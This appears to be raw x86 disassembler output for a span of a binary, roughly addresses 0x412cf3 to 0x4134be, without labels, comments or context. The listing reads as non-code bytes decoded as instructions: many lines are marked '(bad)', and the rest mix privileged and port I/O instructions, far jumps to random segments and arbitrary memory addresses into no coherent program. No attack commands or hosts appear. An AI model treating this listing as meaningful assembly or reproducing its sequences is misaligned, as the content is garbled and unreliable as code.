  412cf3:	ss mov al,ch
  412cf6:	mov    ds:0xe02f8020,eax
  412cfb:	mov    al,ds:0x526afade
  412d00:	bound  eax,QWORD PTR ds:0xa60b6ee4
  412d06:	arpl   WORD PTR [ecx],sp
  412d08:	loope  0x412cb6
  412d0a:	mov    edi,0x1285eb34
  412d0f:	jns    0x412cba
  412d11:	test   al,0xa1
  412d13:	and    edx,DWORD PTR [ebp*4-0x39c03cc6]
  412d1a:	or     bh,dl
  412d1c:	jge    0x412d9b
  412d1e:	dec    ebp
  412d1f:	fsubp  st(6),st
  412d21:	and    DWORD PTR [edx+eax*2+0x36],ebx
  412d25:	add    eax,0xa3049197
  412d2a:	sub    bl,al
  412d2c:	jns    0x412d7a
  412d2e:	xchg   esi,eax
  412d2f:	mov    al,ds:0x696b7eee
  412d34:	sub    BYTE PTR [eax-0x6d],dl
  412d37:	dec    edx
  412d38:	(bad)  [edx+eiz*1-0x9]
  412d3c:	pop    edx
  412d3d:	sti    
  412d3e:	test   al,0xab
  412d40:	dec    edi
  412d41:	pop    ss
  412d42:	loope  0x412d4f
  412d44:	stos   DWORD PTR es:[edi],eax
  412d45:	inc    DWORD PTR [esi+eax*1]
  412d48:	pusha  
  412d49:	pop    ecx
  412d4a:	pop    esp
  412d4b:	adc    al,0xc7
  412d4d:	inc    ebx
  412d4e:	addr16 xchg ebx,eax
  412d50:	sub    BYTE PTR ds:0x6c451bb6,dl
  412d56:	setl   BYTE PTR [esi+0x126f031d]
  412d5d:	mov    ch,0xc6
  412d5f:	xchg   esp,eax
  412d60:	push   ds
  412d61:	call   DWORD PTR [esi+0x652169ef]
  412d67:	jl     0x412d40
  412d69:	out    0xee,al
  412d6b:	or     BYTE PTR [eax-0x456ade37],dl
  412d71:	outs   dx,BYTE PTR ds:[esi]
  412d72:	pop    edi
  412d73:	cmp    esp,DWORD PTR [esi-0x246d78ca]
  412d79:	sub    eax,edi
  412d7b:	test   eax,0x25a9c90f
  412d80:	push   edx
  412d81:	mov    ds:0xcd93f4ef,eax
  412d86:	push   edi
  412d87:	xor    al,0x6e
  412d89:	push   eax
  412d8a:	dec    esp
  412d8b:	ins    DWORD PTR es:[edi],dx
  412d8c:	adc    al,0x3
  412d8e:	sub    eax,0x2663ac48
  412d93:	or     ebp,DWORD PTR [ebx-0x3c4afbf4]
  412d99:	ins    DWORD PTR es:[edi],dx
  412d9a:	repz loop 0x412e10
  412d9d:	jae    0x412d3a
  412d9f:	sub    dl,BYTE PTR [ebp+0x3d]
  412da2:	out    dx,eax
  412da3:	cmp    edi,DWORD PTR [esi-0x609b5ed1]
  412da9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412daa:	fadd   DWORD PTR ss:[eax+0x73]
  412dae:	pop    ebp
  412daf:	ja     0x412d36
  412db1:	jl     0x412df5
  412db3:	jge    0x412def
  412db5:	bswap  edi
  412db7:	mov    al,0x61
  412db9:	jmp    0x5ef5:0x801ee00c
  412dc0:	pop    ebp
  412dc1:	rcl    DWORD PTR [edx+0x6d04b630],0x31
  412dc8:	in     al,dx
  412dc9:	dec    esp
  412dca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412dcb:	test   eax,0x1940814c
  412dd0:	mul    DWORD PTR [edx]
  412dd2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412dd3:	les    esp,FWORD PTR [ecx+0x45c94b88]
  412dd9:	in     al,0xb5
  412ddb:	into   
  412ddc:	mov    ebp,0xc613b10e
  412de1:	daa    
  412de2:	jle    0x412df2
  412de4:	call   0xe442e0bf
  412de9:	pop    edi
  412dea:	mov    ebp,0x252ffd9
  412def:	cld    
  412df0:	loope  0x412dad
  412df2:	cmp    DWORD PTR [edi+esi*4-0x41d3a31e],esp
  412df9:	gs ins DWORD PTR es:[edi],dx
  412dfb:	in     eax,dx
  412dfc:	pop    ds
  412dfd:	sbb    eax,0x87c7c327
  412e02:	add    cl,BYTE PTR [eax-0x39]
  412e05:	nop
  412e06:	mov    ds:0x58e470f6,al
  412e0b:	mov    dh,0xe7
  412e0d:	xor    DWORD PTR [eax+0xf],ecx
  412e10:	imul   eax,edi,0x7
  412e13:	pop    eax
  412e14:	mov    bh,0xbc
  412e16:	fwait
  412e17:	fs nop
  412e19:	inc    edi
  412e1a:	mov    ds:0x1fc3ce65,al
  412e1f:	push   0x5d31e6c2
  412e24:	fld    st(0)
  412e26:	stc    
  412e27:	add    al,0xd
  412e29:	test   DWORD PTR [edx],esp
  412e2b:	mov    DWORD PTR [ebx],edi
  412e2d:	outs   dx,DWORD PTR ds:[esi]
  412e2e:	fisttp WORD PTR [ecx+0x74]
  412e31:	in     al,0xf7
  412e33:	scas   eax,DWORD PTR es:[edi]
  412e34:	add    eax,esi
  412e36:	call   0xea7b9ba4
  412e3b:	pop    ecx
  412e3c:	mov    ebx,DWORD PTR ds:0x6654ba51
  412e42:	adc    eax,0xe08a2ad5
  412e47:	in     al,0x29
  412e49:	test   DWORD PTR [ebx],ebx
  412e4b:	mov    edi,0x935f32a6
  412e50:	sbb    DWORD PTR [eax-0x69],esi
  412e53:	xchg   ebx,eax
  412e54:	push   ds
  412e55:	lahf   
  412e56:	xchg   ebx,edi
  412e58:	inc    eax
  412e59:	shr    BYTE PTR [edx+0x58],0xba
  412e5d:	dec    esi
  412e5e:	je     0x412e2c
  412e60:	out    dx,al
  412e61:	cmp    DWORD PTR [ecx-0x41ccd369],eax
  412e67:	in     eax,0xb6
  412e69:	hlt    
  412e6a:	jno    0x412e3c
  412e6c:	pop    DWORD PTR [eax+0x73]
  412e6f:	xchg   BYTE PTR [ecx-0x5b7fdcea],ch
  412e75:	loopne 0x412eea
  412e77:	retf   0xe44e
  412e7a:	jmp    0xa51b2919
  412e7f:	jmp    DWORD PTR [ebp+ebx*8-0x74a44fb3]
  412e86:	jbe    0x412e7c
  412e88:	call   0x65edae94
  412e8d:	jmp    0x89f28676
  412e92:	add    al,0xca
  412e94:	data16 shr BYTE PTR [edx+0x2b3efec0],1
  412e9b:	mov    al,ds:0x7271a43a
  412ea0:	outs   dx,BYTE PTR ds:[esi]
  412ea1:	xchg   dl,ch
  412ea3:	push   ebp
  412ea4:	sbb    edi,DWORD PTR [eax-0x36]
  412ea7:	xchg   ebp,eax
  412ea8:	xchg   esi,eax
  412ea9:	retfw  
  412eab:	test   eax,0xe5e97cf8
  412eb0:	jmp    0x412f2a
  412eb2:	scas   al,BYTE PTR es:[edi]
  412eb3:	dec    ebx
  412eb4:	imul   ebp,DWORD PTR [ebx],0x3aff4f06
  412eba:	bound  ecx,QWORD PTR [edi+edi*2]
  412ebd:	xchg   ebp,eax
  412ebe:	jl     0x412e62
  412ec0:	and    eax,0x74215844
  412ec5:	push   esi
  412ec6:	loope  0x412eaf
  412ec8:	inc    esi
  412ec9:	(bad)  
  412eca:	pop    ss
  412ecb:	popa   
  412ecc:	xor    al,0x65
  412ece:	xchg   esi,eax
  412ecf:	add    eax,DWORD PTR [ebp+0x27bdc6a5]
  412ed5:	sbb    esp,DWORD PTR [ebx]
  412ed7:	(bad)  
  412ed8:	scas   eax,DWORD PTR es:[edi]
  412ed9:	xor    edi,edi
  412edb:	int    0x95
  412edd:	in     eax,0xb4
  412edf:	push   edx
  412ee0:	sub    ebx,DWORD PTR [eax+0x3c]
  412ee3:	sbb    DWORD PTR [ecx],edi
  412ee5:	popa   
  412ee6:	scas   eax,DWORD PTR es:[edi]
  412ee7:	xor    al,0x2b
  412ee9:	cli    
  412eea:	add    al,0xa7
  412eec:	adc    al,0x82
  412eee:	inc    edx
  412eef:	pop    ecx
  412ef0:	inc    ebx
  412ef1:	jge    0x412f2b
  412ef3:	jp     0x412f58
  412ef5:	xchg   edi,eax
  412ef6:	std    
  412ef7:	sahf   
  412ef8:	mov    ebx,0xb1657cf9
  412efd:	fidivr DWORD PTR [ecx-0x54]
  412f00:	loope  0x412f1f
  412f02:	mov    BYTE PTR [esi-0x4d],al
  412f05:	mov    bl,0x2f
  412f07:	lahf   
  412f08:	loope  0x412ea1
  412f0a:	xor    cl,bl
  412f0c:	sbb    ah,BYTE PTR [esi]
  412f0e:	pause  
  412f10:	pop    ecx
  412f11:	cmp    al,0x36
  412f13:	add    al,0x15
  412f15:	mov    al,ds:0xa31a2efa
  412f1a:	and    DWORD PTR [eax],0xffffffe8
  412f1d:	adc    dh,0x6e
  412f20:	out    dx,al
  412f21:	jno    0x412ee8
  412f23:	arpl   WORD PTR [ecx-0x43],dx
  412f26:	icebp  
  412f27:	test   edx,edi
  412f29:	push   0xffffffeb
  412f2b:	cmp    eax,edi
  412f2d:	adc    eax,0xd5497fc8
  412f32:	mov    fs,WORD PTR [eax+0x21031a1c]
  412f38:	(bad)  
  412f39:	cmp    al,0x14
  412f3b:	cs js  0x412f6f
  412f3e:	(bad)  [ebp-0x11180644]
  412f44:	mov    edx,0x40f9f374
  412f49:	repz push 0x5075b166
  412f4f:	mov    bl,0x4e
  412f51:	or     DWORD PTR [eax-0x7883df48],0x551a4523
  412f5b:	call   0xa712:0xc77271a9
  412f62:	or     bh,ch
  412f64:	arpl   cx,si
  412f66:	(bad)  
  412f67:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412f68:	ret    0xb13
  412f6b:	lds    esi,FWORD PTR [ecx-0x6c13aa39]
  412f71:	pop    eax
  412f72:	sbb    al,0x4f
  412f74:	cwde   
  412f75:	bound  ecx,QWORD PTR cs:[ebx+0x53684daa]
  412f7c:	cmp    ch,BYTE PTR [esi+0x199724db]
  412f82:	sbb    dl,0x74
  412f85:	sub    ch,BYTE PTR [eax]
  412f87:	sbb    eax,0xbd4f91c7
  412f8c:	inc    ebp
  412f8d:	jae    0x412f78
  412f8f:	mov    dl,al
  412f91:	mov    eax,ecx
  412f93:	scas   eax,DWORD PTR es:[edi]
  412f94:	in     eax,0x7b
  412f96:	sub    BYTE PTR [eax-0x5df114fa],dh
  412f9c:	jae    0x412fb8
  412f9e:	and    BYTE PTR [eax],cl
  412fa0:	inc    esp
  412fa1:	cs mov dh,0x9
  412fa4:	(bad)
  412fa8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412fa9:	out    0x22,eax
  412fab:	out    0x13,eax
  412fad:	std    
  412fae:	outs   dx,DWORD PTR ds:[esi]
  412faf:	(bad)  
  412fb1:	daa    
  412fb2:	push   ecx
  412fb3:	aam    0x8e
  412fb5:	mov    bh,0x9e
  412fb7:	xchg   ecx,eax
  412fb8:	(bad)  
  412fb9:	(bad)  
  412fba:	in     al,dx
  412fbb:	popf   
  412fbc:	jmp    0x412ff7
  412fbe:	jp     0x412f9d
  412fc0:	fmul   st(7),st
  412fc2:	or     eax,0x329ad993
  412fc7:	push   eax
  412fc8:	mov    eax,ds:0xce468c75
  412fcd:	pusha  
  412fce:	push   0xfffffff9
  412fd0:	sbb    dl,BYTE PTR [edx]
  412fd2:	es lahf 
  412fd4:	cld    
  412fd5:	push   0x20
  412fd7:	das    
  412fd8:	push   ds
  412fd9:	xor    bl,BYTE PTR [ecx]
  412fdb:	idiv   DWORD PTR ds:0x288f
  412fe0:	fnstenv [edi-0x3d]
  412fe3:	cld    
  412fe4:	bound  esp,QWORD PTR [ebx]
  412fe6:	mov    al,ds:0xe58d6a16
  412feb:	iret   
  412fec:	mov    al,0x40
  412fee:	in     eax,dx
  412fef:	xor    esi,DWORD PTR [eax]
  412ff1:	iret   
  412ff2:	and    eax,0x4580813
  412ff7:	dec    edx
  412ff8:	sub    eax,0xfdffbb9c
  412ffd:	sub    eax,0x2fcefc5f
  413002:	mov    dh,0xfc
  413004:	xchg   BYTE PTR [ebx],ah
  413006:	mov    al,ds:0x1e2b3a32
  41300b:	ficom  WORD PTR [ebx+0x7090407f]
  413011:	xlat   BYTE PTR ds:[ebx]
  413012:	sbb    al,0x34
  413014:	and    DWORD PTR [ecx],esp
  413016:	mov    edi,0xd4cdb1b3
  41301b:	int    0xce
  41301d:	cs sbb esi,esi
  413020:	jbe    0x41303d
  413022:	js     0x413070
  413024:	jo     0x41303f
  413026:	test   BYTE PTR [eax+0x43],0x14
  41302a:	in     eax,dx
  41302b:	and    eax,0x776b19bf
  413030:	cmp    al,0x11
  413032:	inc    esi
  413033:	les    edx,FWORD PTR [edi-0x34]
  413036:	pop    eax
  413037:	fbstp  TBYTE PTR [ebp+0x1fa64ac9]
  41303d:	in     al,dx
  41303e:	adc    ecx,DWORD PTR [esi-0x66]
  413041:	out    0x47,al
  413043:	cmc    
  413044:	xchg   ecx,eax
  413045:	or     BYTE PTR ds:0x165f101e,bl
  41304b:	fbstp  TBYTE PTR [edi+0x1281dd8f]
  413051:	pusha  
  413052:	sub    DWORD PTR [eax-0x416044f3],ebp
  413058:	ins    BYTE PTR es:[edi],dx
  413059:	out    0x97,al
  41305b:	clc    
  41305c:	mov    ah,BYTE PTR [esi+ecx*4+0x192d8af4]
  413063:	ret    0xcca7
  413066:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413067:	loop   0x4130b5
  413069:	sub    BYTE PTR [eax-0x1d],0xf8
  41306d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41306e:	inc    eax
  41306f:	sbb    al,0xf4
  413071:	or     al,0x62
  413073:	sbb    eax,0x4d94617e
  413078:	outs   dx,BYTE PTR ds:[esi]
  413079:	fldenv [ecx]
  41307b:	ins    BYTE PTR es:[edi],dx
  41307c:	je     0x413048
  41307e:	retf   
  41307f:	sub    BYTE PTR [edx+0x2cde5d64],dh
  413085:	cld    
  413086:	cmp    al,0x32
  413088:	sub    eax,0x17
  41308b:	jns    0x41305c
  41308d:	cwde   
  41308e:	and    edx,ecx
  413090:	sub    ah,bl
  413092:	test   eax,0x41053b1f
  413097:	cmp    BYTE PTR [eax-0x35],dl
  41309a:	imul   ebp,DWORD PTR [edx+ecx*4+0x72],0xbd671c0e
  4130a2:	or     DWORD PTR [ebp-0x5bb333a6],eax
  4130a8:	addr16 mov edi,0x3002fa4f
  4130ae:	adc    edx,DWORD PTR [esi-0x2b]
  4130b1:	add    BYTE PTR [esp+edx*2+0x69c687d5],0x6a
  4130b9:	outs   dx,BYTE PTR ds:[esi]
  4130ba:	push   esp
  4130bb:	pop    edi
  4130bc:	dec    BYTE PTR [edi+0x30e5eb3e]
  4130c2:	cs xchg ebx,eax
  4130c4:	icebp  
  4130c5:	push   ebp
  4130c6:	adc    ch,bl
  4130c8:	repz repnz xor al,0xf5
  4130cc:	pushf  
  4130cd:	jne    0x4130cc
  4130cf:	mov    bh,0xe1
  4130d1:	int3   
  4130d2:	test   eax,0x59df1e84
  4130d7:	in     al,dx
  4130d8:	add    al,0x81
  4130da:	pop    es
  4130db:	daa    
  4130dc:	cwde   
  4130dd:	ficomp WORD PTR [edx]
  4130df:	les    esi,FWORD PTR [eax]
  4130e1:	fucomip st,st(5)
  4130e3:	push   DWORD PTR [ebp+0x2810f614]
  4130e9:	popf   
  4130ea:	shl    edi,1
  4130ec:	dec    ecx
  4130ed:	popa   
  4130ee:	mov    eax,DWORD PTR [ebx+0x39]
  4130f1:	pop    eax
  4130f2:	aaa    
  4130f3:	cmp    eax,0x2791f1f3
  4130f8:	cmp    al,0x90
  4130fa:	fwait
  4130fb:	sar    ch,0xb
  4130fe:	xor    bh,0xa6
  413101:	lods   eax,DWORD PTR ds:[esi]
  413102:	nop
  413103:	sub    BYTE PTR [ebx],dh
  413105:	sbb    eax,0x5e8b498a
  41310a:	(bad)  
  41310b:	hlt    
  41310c:	out    dx,eax
  41310d:	popf   
  41310e:	push   ebp
  41310f:	loopne 0x4130d8
  413111:	popa   
  413112:	jo     0x4130d9
  413114:	dec    ebx
  413115:	xchg   ecx,eax
  413116:	mov    al,al
  413118:	popf   
  413119:	ins    DWORD PTR es:[edi],dx
  41311a:	pop    ebp
  41311b:	cmp    eax,0x72e13314
  413120:	xchg   esp,eax
  413121:	das    
  413122:	cmp    DWORD PTR [ebx-0x4882931],esp
  413128:	xchg   ebx,eax
  413129:	mov    ebx,0x39a33032
  41312e:	(bad)  
  41312f:	outs   dx,BYTE PTR ds:[esi]
  413130:	popf   
  413131:	jmp    0x3a61f993
  413136:	inc    ebx
  413137:	daa    
  413138:	add    eax,0xb9d65672
  41313d:	loop   0x41311c
  41313f:	scas   al,BYTE PTR es:[edi]
  413140:	pop    esi
  413141:	mov    cl,0x90
  413143:	test   BYTE PTR [ebp+0x15],dl
  413146:	cmp    al,0x96
  413148:	mov    WORD PTR [ebp-0x1f9b6c91],es
  41314e:	fstp   st(7)
  413150:	mov    eax,ds:0x7df6fd37
  413155:	cmp    BYTE PTR [ebx+0x1f],ch
  413158:	adc    dh,BYTE PTR [ebx-0x45bb32e0]
  41315e:	pop    eax
  41315f:	push   edi
  413160:	mov    al,0xae
  413162:	lods   eax,DWORD PTR ds:[esi]
  413163:	pop    eax
  413164:	es pop ebx
  413166:	pop    ebx
  413167:	jo     0x413136
  413169:	call   0xaec1:0x7b851d42
  413170:	push   ds
  413171:	pop    esi
  413172:	fcmove st,st(2)
  413174:	inc    eax
  413175:	jp     0x4131ed
  413177:	dec    ecx
  413178:	mov    ecx,0xb00d501b
  41317d:	dec    ebx
  41317e:	vsubpd xmm5,xmm0,XMMWORD PTR [esi+0x51]
  413183:	call   0xc68e04f4
  413188:	inc    esi
  413189:	scas   eax,DWORD PTR es:[edi]
  41318a:	xchg   edi,eax
  41318b:	mov    eax,0xe5fedfef
  413190:	test   BYTE PTR [ebx+0x55],ch
  413193:	jl     0x4131bb
  413195:	add    dl,BYTE PTR [edi+ebp*8+0x1f]
  413199:	and    edx,DWORD PTR [ebx+0x1]
  41319c:	adc    DWORD PTR [ebp-0x43],0xbcffb33a
  4131a3:	or     dl,BYTE PTR [edx+eiz*2]
  4131a6:	adc    BYTE PTR [eax+0x3e],dl
  4131a9:	dec    ecx
  4131aa:	xchg   esi,eax
  4131ab:	or     eax,0x628c300e
  4131b0:	out    0x91,al
  4131b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4131b3:	jp     0x4131a1
  4131b5:	cmp    al,0x9c
  4131b7:	(bad)  
  4131b8:	pop    ebp
  4131b9:	test   BYTE PTR [ebp-0x2b],bh
  4131bc:	aam    0x9b
  4131be:	jb     0x413229
  4131c0:	inc    ebx
  4131c1:	bound  edx,QWORD PTR [ebx-0x1a]
  4131c4:	or     eax,DWORD PTR [ebx-0x5e]
  4131c7:	push   edx
  4131c8:	not    DWORD PTR [edx+0x52baef8c]
  4131ce:	clc    
  4131cf:	mov    esi,0x412afd6d
  4131d4:	(bad)  
  4131d5:	mov    dh,BYTE PTR [ebx]
  4131d7:	pop    edx
  4131d8:	loop   0x41316f
  4131da:	xor    BYTE PTR [ebx-0x44],al
  4131dd:	add    al,0xf2
  4131df:	jnp    0x41320b
  4131e1:	ds pop es
  4131e3:	gs data16 icebp 
  4131e6:	xchg   edx,eax
  4131e7:	rcl    BYTE PTR [edi+0x69],cl
  4131ea:	xchg   ebx,eax
  4131eb:	dec    edi
  4131ec:	mov    eax,0xaa107595
  4131f1:	and    BYTE PTR [esi+esi*4],cl
  4131f4:	jne    0x413185
  4131f6:	push   ecx
  4131f7:	pop    ds
  4131f8:	push   0x9a755d57
  4131fd:	lock xchg BYTE PTR [ecx],ch
  413200:	repz jg 0x413229
  413203:	mov    ecx,0xe7b65129
  413208:	add    al,0xb0
  41320a:	mov    esp,0xa5563146
  41320f:	leave  
  413210:	aad    0x3d
  413212:	pop    edx
  413213:	push   0xc2984f85
  413218:	mov    gs,WORD PTR ds:0x2c343450
  41321e:	push   esp
  41321f:	dec    eax
  413220:	stos   BYTE PTR es:[edi],al
  413221:	push   ebp
  413222:	shl    DWORD PTR [ebx+0x21],0x18
  413226:	and    al,0xc2
  413228:	dec    edi
  413229:	scas   al,BYTE PTR es:[edi]
  41322a:	add    DWORD PTR [ecx-0x58],esp
  41322d:	sub    ebx,ebx
  41322f:	call   0x7895f788
  413234:	sub    DWORD PTR [ebp-0x6e81a84a],edi
  41323a:	out    dx,eax
  41323b:	(bad)  
  41323c:	inc    DWORD PTR [edx]
  41323e:	fdivr  DWORD PTR [edi+0x651b809d]
  413244:	out    dx,al
  413245:	adc    al,0xbb
  413247:	add    BYTE PTR [eax+eiz*8-0x2],0x39
  41324c:	loopne 0x41325d
  41324e:	add    BYTE PTR [ecx],bh
  413250:	retf   0xfcda
  413253:	adc    dl,BYTE PTR [esi]
  413255:	sub    ah,BYTE PTR [ecx]
  413257:	xchg   ebp,eax
  413258:	sub    al,0x2e
  41325a:	jmp    0x83df:0xb4e0dc16
  413261:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413262:	pop    esp
  413264:	lods   eax,DWORD PTR ds:[esi]
  413265:	addr16 mov dl,0xa
  413268:	repz loope 0x4131ee
  41326b:	inc    ebx
  41326c:	scas   al,BYTE PTR es:[edi]
  41326d:	inc    esi
  41326e:	test   BYTE PTR [ebx+0x2bffd894],cl
  413274:	mov    DWORD PTR [esi-0x34],ebp
  413277:	jg     0x413282
  413279:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41327a:	pushf  
  41327b:	add    eax,0xe37ab7f2
  413280:	mov    ebp,gs
  413282:	cmp    al,0xc1
  413284:	ret    0x4e2e
  413287:	mov    esi,esp
  413289:	inc    eax
  41328a:	scas   eax,DWORD PTR es:[edi]
  41328b:	sbb    edi,ecx
  41328d:	rol    cl,1
  41328f:	aas    
  413290:	mov    eax,ds:0xaa30cb21
  413295:	retf   
  413296:	repz jae 0x413243
  413299:	cmc    
  41329a:	daa    
  41329b:	call   0xc88f:0x18d219dd
  4132a2:	cwde   
  4132a3:	iret   
  4132a4:	(bad)  
  4132a5:	mov    ch,0x4
  4132a7:	push   ebx
  4132a8:	stc    
  4132a9:	ss iret 
  4132ab:	sub    eax,0x5c7bd609
  4132b0:	xchg   esp,eax
  4132b1:	out    0x35,eax
  4132b3:	not    BYTE PTR [eax+0x1b6af4d3]
  4132b9:	scas   al,BYTE PTR es:[edi]
  4132ba:	sub    al,0xaa
  4132bc:	sub    BYTE PTR [ebx-0x4ac0db3f],0xfd
  4132c3:	sbb    DWORD PTR [eax],0xffffffd4
  4132c6:	repnz inc edi
  4132c8:	push   0x2b7ac6a1
  4132cd:	lds    esp,FWORD PTR [eax+0xe]
  4132d0:	cs cmc 
  4132d2:	sub    BYTE PTR [ebx-0x61573d17],cl
  4132d8:	jbe    0x413326
  4132da:	inc    ecx
  4132db:	jl     0x4132f5
  4132dd:	xchg   ebx,eax
  4132de:	into   
  4132df:	imul   eax,DWORD PTR [edi],0xffffffb8
  4132e2:	repnz or al,0x4e
  4132e5:	jmp    0x4132bb
  4132e7:	das    
  4132e8:	pop    ebx
  4132e9:	push   ebx
  4132ea:	jns    0x413355
  4132ec:	out    0xbe,al
  4132ee:	mov    dh,0xc9
  4132f0:	js     0x4132b4
  4132f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4132f3:	imul   BYTE PTR [eax]
  4132f5:	ds push ss
  4132f7:	arpl   sp,dx
  4132f9:	loop   0x413311
  4132fb:	and    ecx,DWORD PTR [esp+ebx*1-0x13]
  4132ff:	xor    ebx,DWORD PTR ds:0xe4cec9e8
  413305:	fs sti 
  413307:	shr    BYTE PTR [eax+0x50],1
  41330a:	push   ecx
  41330b:	addr16 lock pusha 
  41330e:	push   cs
  41330f:	or     BYTE PTR [eax+0x7ead1b6d],dl
  413315:	cmp    BYTE PTR [esi],al
  413317:	xor    ecx,DWORD PTR [ebp-0x7d]
  41331a:	jns    0x41331b
  41331c:	sbb    cl,BYTE PTR ds:0x458df28c
  413322:	or     cl,BYTE PTR [ebp+0x56e33f2b]
  413328:	test   al,0x5e
  41332a:	ds push ecx
  41332c:	mov    dh,0xba
  41332e:	or     esi,DWORD PTR [ecx+ebx*4-0x34]
  413332:	loope  0x4132c3
  413334:	into   
  413335:	test   DWORD PTR [eax+ebx*1],edi
  413338:	mov    edx,0x888043f4
  41333d:	mov    bl,0xf7
  41333f:	cli    
  413340:	stos   BYTE PTR es:[edi],al
  413341:	and    bl,ah
  413343:	pop    ecx
  413344:	inc    ebx
  413345:	lods   eax,DWORD PTR ds:[esi]
  413346:	scas   eax,DWORD PTR es:[edi]
  413347:	or     al,0x21
  413349:	adc    al,0xe0
  41334b:	or     eax,0x2e8479cd
  413350:	add    DWORD PTR [ecx],0xd409a9f0
  413356:	cli    
  413357:	mov    cl,0x3e
  413359:	test   eax,0xea8761a4
  41335e:	and    eax,0xd22b81
  413363:	imul   ebx,DWORD PTR [esi],0xa1f0e25a
  413369:	or     BYTE PTR [edx],bh
  41336b:	push   0xe6aa5113
  413370:	sub    BYTE PTR [eax+ebx*8+0x1a23fe36],dh
  413377:	iret   
  413378:	jecxz  0x413382
  41337a:	mov    dh,0x6f
  41337c:	add    BYTE PTR [edx+0x63],al
  41337f:	loope  0x4133af
  413381:	lds    edi,FWORD PTR [edi]
  413383:	mov    dl,0x2b
  413385:	in     al,dx
  413386:	test   DWORD PTR [ecx-0x141ae69f],esi
  41338c:	sub    eax,0xddf9ac62
  413391:	sub    eax,DWORD PTR [edx]
  413393:	xor    eax,0x61d3d895
  413398:	into   
  413399:	iret   
  41339a:	push   0x4af0a0e5
  41339f:	inc    edi
  4133a0:	cmp    DWORD PTR ds:0x25d8279,edi
  4133a6:	sbb    DWORD PTR [edx],ebx
  4133a8:	rsm    
  4133aa:	xor    ah,BYTE PTR [ebp+0x14]
  4133ad:	sbb    BYTE PTR [ebx+eiz*4-0x6d526cf5],al
  4133b4:	push   ecx
  4133b5:	retf   0x6ea7
  4133b8:	add    DWORD PTR [ebp+0x75],ebx
  4133bb:	push   ebx
  4133bc:	(bad)  
  4133bd:	rol    dh,cl
  4133bf:	jne    0x4133b7
  4133c1:	in     eax,0xd0
  4133c3:	cld    
  4133c4:	mov    ?,WORD PTR [ebp-0x80]
  4133c7:	inc    eax
  4133c8:	mov    ebp,0xc2304a35
  4133cd:	cld    
  4133ce:	and    bl,BYTE PTR [ebp+0x2a]
  4133d1:	int    0x4b
  4133d3:	clc    
  4133d4:	pop    edx
  4133d5:	cld    
  4133d6:	nop
  4133d7:	push   0xeb16f52e
  4133dc:	xchg   esi,eax
  4133dd:	clc    
  4133de:	loop   0x4133e7
  4133e0:	jle    0x4133c8
  4133e2:	mov    al,ds:0xccc55a72
  4133e7:	pushf  
  4133e8:	pop    eax
  4133e9:	fisub  DWORD PTR [ebp+0x43060094]
  4133ef:	cmp    ebx,DWORD PTR [esi-0x1c29b347]
  4133f5:	jge    0x4133d6
  4133f7:	out    0x7,eax
  4133f9:	pushf  
  4133fa:	cmp    eax,DWORD PTR [edi+0x546ee1ce]
  413400:	inc    ebx
  413401:	add    edi,0xffffffa0
  413404:	pop    edi
  413405:	jmp    0x413469
  413407:	and    dl,al
  413409:	or     eax,0xc08e8090
  41340e:	mov    ds:0x647e44ea,al
  413413:	ret    
  413414:	and    al,0xf1
  413416:	jne    0x41347c
  413418:	push   ecx
  413419:	and    BYTE PTR [edx+0x33],0xc1
  41341d:	xchg   BYTE PTR [edx],ah
  41341f:	xor    bl,BYTE PTR [esi+ebx*1]
  413422:	push   eax
  413423:	push   edi
  413424:	fmul   DWORD PTR [eax+0x53]
  413427:	xchg   ebx,eax
  413428:	stos   DWORD PTR es:[edi],eax
  413429:	(bad)  
  41342a:	stc    
  41342b:	(bad)  
  41342c:	push   ds
  41342d:	adc    edi,ecx
  41342f:	xor    al,0x43
  413431:	mov    WORD PTR [edi-0x15014336],cs
  413437:	add    al,0x9e
  413439:	lds    eax,FWORD PTR [ebx+0x5a672e9b]
  41343f:	mov    bl,BYTE PTR [edi-0x53]
  413442:	sbb    eax,DWORD PTR [esi]
  413444:	xor    ch,bh
  413446:	push   esi
  413447:	or     eax,0xad3db10d
  41344c:	mov    esp,ebp
  41344e:	dec    ebx
  41344f:	xchg   eax,esp
  413451:	(bad)  
  413452:	cmp    edx,DWORD PTR [ebx-0x30]
  413455:	nop
  413456:	lods   eax,DWORD PTR ds:[esi]
  413457:	aaa    
  413458:	mov    edi,0x6e2cfaef
  41345d:	or     edi,eax
  41345f:	out    0xe7,al
  413461:	test   eax,0x9612826f
  413466:	jns    0x413428
  413468:	das    
  413469:	das    
  41346a:	scas   al,BYTE PTR es:[edi]
  41346b:	je     0xd1973b7d
  413471:	mov    DWORD PTR [edx+0x72],eax
  413474:	fs mov ecx,0x97378d6f
  41347a:	stc    
  41347b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41347c:	push   esi
  41347d:	loope  0x4134d0
  41347f:	jae    0x4134e8
  413481:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413482:	ds mov dh,0xbc
  413485:	ret    0xf25d
  413488:	jp     0x413453
  41348a:	out    0x59,eax
  41348c:	jecxz  0x413469
  41348e:	jne    0x41341c
  413490:	or     BYTE PTR [edi],cl
  413492:	and    DWORD PTR [eax+0x7e03f158],ebp
  413498:	jbe    0x4134c7
  41349a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41349b:	and    ah,cl
  41349d:	sbb    eax,0x22b13cec
  4134a2:	pop    ss
  4134a3:	jb     0x413512
  4134a5:	cmp    ecx,DWORD PTR [esi]
  4134a7:	sub    dh,BYTE PTR [edx-0x23]
  4134aa:	adc    eax,0x4093b55a
  4134af:	in     eax,dx
  4134b0:	push   cs
  4134b1:	push   esi
  4134b2:	inc    eax
  4134b3:	and    BYTE PTR [esi],al
  4134b5:	pcmpgtd mm5,QWORD PTR [ecx+ebx*8-0x40b5303b]
  4134bd:	inc    edi
  4134be:	or     ecx,DWORD PTR [ebp+0x5c]
